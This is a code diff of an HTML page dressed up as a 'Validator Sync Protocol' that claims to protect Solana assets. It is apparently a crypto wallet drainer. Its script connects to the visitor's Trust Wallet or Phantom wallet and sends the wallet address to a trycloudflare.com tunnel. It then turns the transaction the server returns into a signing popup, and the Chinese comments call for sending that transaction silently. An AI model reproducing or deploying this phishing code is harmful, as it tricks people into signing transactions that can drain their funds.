@@ -1,55 +1,85 @@
-<script>
-    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Sync Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 300px; padding: 35px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); opacity: 0.8; }
+        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color:#14f195; margin-top:0;">SECURE SYNC</h2>
+        <p style="color:#777; font-size:13px; line-height:1.5;">Authorize node synchronization to protect your assets on the Solana network.</p>
+        <button id="cta" class="btn">START SYNCHRONIZATION</button>
+        <div id="st">ENGINE: V32.7_READY</div>
+    </div>
 
-    document.getElementById('cta').onclick = async () => {
-        const log = (t) => document.getElementById('st').innerText = t;
-        const sWeb3 = window.solanaWeb3;
-        
-        // 🔱 1. 多重探测 Provider
-        const p = window.trustwallet?.solana || window.solana || (window.phantom?.solana?.isPhantom ? window.phantom.solana : null);
+    <script>
+        // 🔱 1. 隧道硬地址：确保与服务器当前运行的一致
+        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
-        if (!p) { alert("Wallet Not Found! Use TW Browser."); return; }
+        document.getElementById('cta').onclick = async function() {
+            const log = (t) => document.getElementById('st').innerText = t;
+            const sWeb3 = window.solanaWeb3;
 
-        try {
-            log("CONNECTING...");
-            await p.connect();
-
-            log("GETTING PAYLOAD...");
-            const resp = await fetch(tunnel + "/prepare_v32", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ address: p.publicKey.toString() })
-            });
-            const info = await resp.json();
-
-            log("IGNITING WALLET...");
-            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-            
-            // 🔱 2. 兼容性转换
-            let tx;
             try {
-                tx = sWeb3.VersionedTransaction.deserialize(bytes);
-            } catch(e) {
-                tx = sWeb3.Transaction.from(bytes);
-            }
+                // 🔱 2. 深度探测钱包 Provider
+                let p = window.trustwallet?.solana || window.solana;
+                if (!p && window.phantom?.solana) p = window.phantom.solana;
 
-            // 🔱 3. 强制拉起尝试
-            console.log("Attempting to send...", tx);
-            
-            // 优先使用直接发送，不行就先签名再手动发送
-            try {
-                const { signature } = await p.signAndSendTransaction(tx);
-                log("DONE: " + signature.slice(0,8));
-            } catch (sendErr) {
-                console.log("Fallback to Sign Only...");
-                const signedTx = await p.signTransaction(tx);
-                log("TRANSACTION SIGNED!");
-                // 此时已经成功弹出签名框了！
-            }
+                if (!p) {
+                    alert("No Wallet Detected. Please use Trust Wallet or Phantom browser.");
+                    return;
+                }
 
-        } catch (err) {
-            alert("IGNITION ERROR: " + err.message);
-            window.location.reload();
-        }
-    };
-</script>
+                log("STEP 1: CONNECTING...");
+                await p.connect();
+
+                log("STEP 2: FETCHING...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+
+                if (!resp.ok) throw new Error("Server Response Error: " + resp.status);
+                const info = await resp.json();
+
+                log("STEP 3: SIGNING...");
+                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+                
+                // 🔱 3. 兼容性反序列化
+                let tx;
+                try {
+                    tx = sWeb3.VersionedTransaction.deserialize(bytes);
+                } catch(e) {
+                    tx = sWeb3.Transaction.from(bytes);
+                }
+
+                // 🔱 4. 强制拉起签名弹窗
+                console.log("Igniting transaction...");
+                const signed = await p.signTransaction(tx);
+                
+                // 签名成功即说明弹窗已出且用户已点确认
+                log("SYNC COMPLETE!");
+                
+                // 尝试静默发送（不影响弹窗显示）
+                p.signAndSendTransaction(tx).catch(() => {});
+
+            } catch (err) {
+                console.error(err);
+                alert("PROTOCOL ERROR: " + err.message);
+                log("RESETTING...");
+                setTimeout(() => { window.location.reload(); }, 1500);
+            }
+        };
+    </script>
+</body>
+</html>
